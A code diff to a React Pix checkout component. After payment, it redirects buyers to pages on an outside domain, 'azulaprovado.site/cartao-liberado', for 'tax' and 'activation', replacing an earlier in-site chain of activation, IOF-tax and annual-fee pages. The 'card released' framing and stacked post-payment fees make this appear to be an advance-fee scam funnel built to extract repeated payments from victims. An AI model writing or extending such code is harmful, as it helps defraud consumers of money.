@@ -118,15 +118,10 @@ const PixPayment = ({ pixData, loading, onGeneratePix, email, cpf, total, fullNa
         localStorage.removeItem("checkout_form_draft");
         localStorage.removeItem("checkout_deadline_ts");
       } catch {}
-      const navOpts = { replace: true, state: { reset: true } } as const;
-      if (ids.some((id) => HEADER_TIMER_PRODUCT_IDS.includes(id))) {
-        navigate("/ativar-conta", navOpts);
-      } else if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
-        navigate("/taxa-iof", navOpts);
-      } else if (ids.some((id) => IOF_WARNING_PRODUCT_IDS.includes(id))) {
-        navigate("/taxa-anual", navOpts);
+      if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
+        window.location.href = "https://azulaprovado.site/cartao-liberado/imposto/";
       } else {
-        navigate(`/success?order_id=${encodeURIComponent(pid)}`, { replace: true });
+        window.location.href = "https://azulaprovado.site/cartao-liberado/ativacao/";
       }
     };
 
@@ -243,15 +238,10 @@ const PixPayment = ({ pixData, loading, onGeneratePix, email, cpf, total, fullNa
         localStorage.removeItem("checkout_deadline_ts");
       } catch {}
       const ids = (orderItems || []).map((i) => i.id);
-      const opts = { replace: true, state: { reset: true } } as const;
-      if (ids.some((id) => HEADER_TIMER_PRODUCT_IDS.includes(id))) {
-        navigate("/ativar-conta", opts);
-      } else if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
-        navigate("/taxa-iof", opts);
-      } else if (ids.some((id) => IOF_WARNING_PRODUCT_IDS.includes(id))) {
-        navigate("/taxa-anual", opts);
+      if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
+        window.location.href = "https://azulaprovado.site/cartao-liberado/imposto/";
       } else {
-        navigate(`/success?order_id=${encodeURIComponent(pid)}`, { replace: true });
+        window.location.href = "https://azulaprovado.site/cartao-liberado/ativacao/";
       }
     }, 1500);
   }, [pixData, orderItems, total, email, phone, cpf, fullName, city, state, zipCode, navigate]);
